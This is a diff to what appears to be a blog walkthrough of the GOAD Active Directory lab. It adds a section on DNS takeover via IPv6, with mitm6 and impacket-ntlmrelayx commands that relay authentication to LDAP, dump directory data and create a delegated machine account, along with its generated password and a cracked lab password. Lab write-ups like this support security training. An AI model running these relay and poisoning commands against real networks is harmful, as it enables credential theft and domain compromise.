@@ -140,7 +140,7 @@
 
   <div>
         <div class="toc col-lg-3 hidden-xs hidden-sm">
-            <div id="toc"><ul><li><a class="toc-href" href="#status" title="Status">Status</a></li><li><a class="toc-href" href="#initial-enumeration" title="Initial Enumeration">Initial Enumeration</a></li><li><a class="toc-href" href="#smb-relay" title="SMB Relay">SMB Relay</a></li><li><a class="toc-href" href="#llmnr-poisoning" title="LLMNR Poisoning">LLMNR Poisoning</a></li><li><a class="toc-href" href="#plaintext-password" title="Plaintext Password">Plaintext Password</a></li><li><a class="toc-href" href="#password-spraying" title="Password Spraying">Password Spraying</a></li><li><a class="toc-href" href="#credentials-dumping" title="Credentials Dumping">Credentials Dumping</a></li><li><a class="toc-href" href="#donpapi" title="DonPAPI">DonPAPI</a></li><li><a class="toc-href" href="#mimikatz" title="Mimikatz">Mimikatz</a></li><li><a class="toc-href" href="#gpo-abuse" title="GPO Abuse">GPO Abuse</a></li><li><a class="toc-href" href="#shares-enumeration" title="Shares Enumeration">Shares Enumeration</a></li><li><a class="toc-href" href="#kerberoasting" title="Kerberoasting">Kerberoasting</a></li><li><a class="toc-href" href="#as-rep-roasting" title="AS-REP Roasting">AS-REP Roasting</a></li><li><a class="toc-href" href="#unconstrained-delegation" title="Unconstrained Delegation">Unconstrained Delegation</a></li><li><a class="toc-href" href="#golden-ticket" title="Golden Ticket">Golden Ticket</a></li><li><a class="toc-href" href="#silver-ticket" title="Silver Ticket">Silver Ticket</a></li></ul></div>
+            <div id="toc"><ul><li><a class="toc-href" href="#status" title="Status">Status</a></li><li><a class="toc-href" href="#initial-enumeration" title="Initial Enumeration">Initial Enumeration</a></li><li><a class="toc-href" href="#smb-relay" title="SMB Relay">SMB Relay</a></li><li><a class="toc-href" href="#llmnr-poisoning" title="LLMNR Poisoning">LLMNR Poisoning</a></li><li><a class="toc-href" href="#dns-takeover-via-ipv6" title="DNS takeover via IPv6">DNS takeover via IPv6</a></li><li><a class="toc-href" href="#plaintext-password" title="Plaintext Password">Plaintext Password</a></li><li><a class="toc-href" href="#password-spraying" title="Password Spraying">Password Spraying</a></li><li><a class="toc-href" href="#credentials-dumping" title="Credentials Dumping">Credentials Dumping</a></li><li><a class="toc-href" href="#donpapi" title="DonPAPI">DonPAPI</a></li><li><a class="toc-href" href="#mimikatz" title="Mimikatz">Mimikatz</a></li><li><a class="toc-href" href="#gpo-abuse" title="GPO Abuse">GPO Abuse</a></li><li><a class="toc-href" href="#shares-enumeration" title="Shares Enumeration">Shares Enumeration</a></li><li><a class="toc-href" href="#kerberoasting" title="Kerberoasting">Kerberoasting</a></li><li><a class="toc-href" href="#as-rep-roasting" title="AS-REP Roasting">AS-REP Roasting</a></li><li><a class="toc-href" href="#unconstrained-delegation" title="Unconstrained Delegation">Unconstrained Delegation</a></li><li><a class="toc-href" href="#golden-ticket" title="Golden Ticket">Golden Ticket</a></li><li><a class="toc-href" href="#silver-ticket" title="Silver Ticket">Silver Ticket</a></li></ul></div>
         </div>
     <h2 id="status">Status</h2>
 <p>Recovered Passwords:</p>
@@ -748,6 +748,20 @@
 <p>Recovered the <code>robb.stark</code> password:</p>
 <div class="highlight"><pre><span></span><code>sexywolfy
 </code></pre></div>
+<h2 id="dns-takeover-via-ipv6">DNS takeover via IPv6</h2>
+<div class="highlight"><pre><span></span><code>sudo mitm6 -d north.sevenkingdoms.local -d sevenkingdoms.local -d essos.local
+</code></pre></div>
+<p><strong>Attacking winterfell</strong></p>
+<p>Dump loot:</p>
+<div class="highlight"><pre><span></span><code>impacket-ntlmrelayx<span class="w"> </span>-6<span class="w"> </span>-wh<span class="w"> </span>attackerwpad.north.sevenkingdoms.local<span class="w"> </span>-t<span class="w"> </span>ldap://10.1.0.11<span class="w"> </span>-l<span class="w"> </span>dumps/loot
+</code></pre></div>
+<p><img alt="Pasted image 20250209171942.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250209171942.png"/></p>
+<p><strong>Cannot create backdoor user due to constraint failing!</strong></p>
+<p>Add computer with delegation capabilities to relayed computer (castelblack) for Resource-based Constrained delegation:</p>
+<div class="highlight"><pre><span></span><code>impacket-ntlmrelayx<span class="w"> </span>-6<span class="w"> </span>-wh<span class="w"> </span>attackerwpad.north.sevenkingdoms.local<span class="w"> </span>-t<span class="w"> </span>ldap://10.1.0.11<span class="w"> </span>-l<span class="w"> </span>dumps/loot<span class="w"> </span>--add-computer<span class="w"> </span>castelwhite<span class="w"> </span>--delegate-access
+</code></pre></div>
+<p>Adding new computer with username: castelwhite$ and password: 5D#0+MA.;QgRvh.</p>
+<p><img alt="Pasted image 20250209175315.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250209175315.png"/></p>
 <h2 id="plaintext-password">Plaintext Password</h2>
 <p>After enumerating users with <code>robb.stark</code>, a cleartext password for user <code>samwell.tarly</code> is found in the description property:</p>
 <p><img alt="north-users-enumetation.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-users-enumetation.png"/></p>
